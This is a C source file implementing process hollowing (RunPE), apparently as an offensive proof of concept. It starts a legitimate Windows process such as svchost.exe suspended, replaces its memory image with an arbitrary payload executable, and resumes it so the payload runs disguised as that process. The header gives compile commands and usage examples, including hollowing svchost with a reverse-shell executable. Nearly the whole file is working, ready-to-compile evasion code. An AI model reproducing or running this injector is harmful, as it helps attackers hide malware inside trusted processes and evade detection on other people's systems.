/*
 * Process Hollowing (RunPE) — Create a suspended process, hollow it, inject payload
 *
 * MITRE ATT&CK: T1055.012 — Process Hollowing
 * Severity: HIGH
 *
 * Technique:
 *   1. Create a legitimate process (e.g., svchost.exe) in SUSPENDED state
 *   2. Unmap its image from memory (NtUnmapViewOfSection)
 *   3. Allocate new memory and write our payload PE
 *   4. Fix the PEB and thread context to point to our entry
 *   5. Resume the thread — our code runs as the legitimate process
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o hollow.exe process_hollowing.c -lntdll
 *   cl process_hollowing.c /Fe:hollow.exe ntdll.lib
 *
 * Usage:
 *   hollow.exe <path_to_payload_exe> [host_process]
 *   hollow.exe calc.exe                           (hollow svchost with calc)
 *   hollow.exe C:\payloads\revshell.exe svchost   (hollow svchost with revshell)
 */

#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS 0

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Process Hollowing PoC\n");
        printf("Usage: %s <payload.exe> [host_process]\n", argv[0]);
        printf("  %s calc.exe\n", argv[0]);
        printf("  %s revshell.exe svchost.exe\n", argv[0]);
        return 1;
    }

    char* payloadPath = argv[1];
    char* hostProcess = argc > 2 ? argv[2] : "svchost.exe";

    // Resolve host process path
    char hostPath[MAX_PATH];
    if (strchr(hostProcess, '\\') || strchr(hostProcess, '/')) {
        strncpy(hostPath, hostProcess, MAX_PATH);
    } else {
        snprintf(hostPath, MAX_PATH, "C:\\Windows\\System32\\%s", hostProcess);
    }

    printf("[*] Process Hollowing PoC\n");
    printf("[*] Host: %s\n", hostPath);
    printf("[*] Payload: %s\n", payloadPath);

    // Step 1: Read payload PE into memory
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open payload: %s (error %lu)\n", payloadPath, GetLastError());
        return 1;
    }

    DWORD payloadSize = GetFileSize(hFile, NULL);
    BYTE* payloadBuf = (BYTE*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, payloadBuf, payloadSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Payload read: %lu bytes\n", bytesRead);

    // Validate PE
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)payloadBuf;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid PE file\n");
        return 1;
    }
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(payloadBuf + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid PE signature\n");
        return 1;
    }

    // Step 2: Create host process in SUSPENDED state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(hostPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed for %s (error %lu)\n", hostPath, GetLastError());
        return 1;
    }
    printf("[+] Created suspended process: PID %lu, TID %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Step 3: Get the PEB and image base of the host
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ULONGLONG imageBase;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(imageBase), NULL);
    printf("[+] Host image base: 0x%llx\n", imageBase);
#else
    DWORD imageBase;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &imageBase, sizeof(imageBase), NULL);
    printf("[+] Host image base: 0x%lx\n", imageBase);
#endif

    // Step 4: Unmap the host's image
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);
    printf("[+] Unmapped host image\n");

    // Step 5: Allocate memory at the payload's preferred base
    PVOID remoteBase = VirtualAllocEx(pi.hProcess,
        (PVOID)ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteBase) {
        // Try at any address if preferred base is taken
        remoteBase = VirtualAllocEx(pi.hProcess, NULL,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remoteBase) {
        printf("[-] VirtualAllocEx failed\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated %lu bytes at 0x%p\n", ntHeaders->OptionalHeader.SizeOfImage, remoteBase);

    // Step 6: Write PE headers
    WriteProcessMemory(pi.hProcess, remoteBase, payloadBuf,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Step 7: Write PE sections
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0) {
            WriteProcessMemory(pi.hProcess,
                (BYTE*)remoteBase + sections[i].VirtualAddress,
                payloadBuf + sections[i].PointerToRawData,
                sections[i].SizeOfRawData, NULL);
        }
    }
    printf("[+] Written %d sections\n", ntHeaders->FileHeader.NumberOfSections);

    // Step 8: Update PEB image base
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(remoteBase), NULL);
    ctx.Rcx = (ULONGLONG)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &remoteBase, sizeof(remoteBase), NULL);
    ctx.Eax = (DWORD)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

    // Step 9: Set thread context and resume
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] Process hollowed and resumed!\n");
    printf("[+] Payload running inside %s (PID %lu)\n", hostProcess, pi.dwProcessId);

    VirtualFree(payloadBuf, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
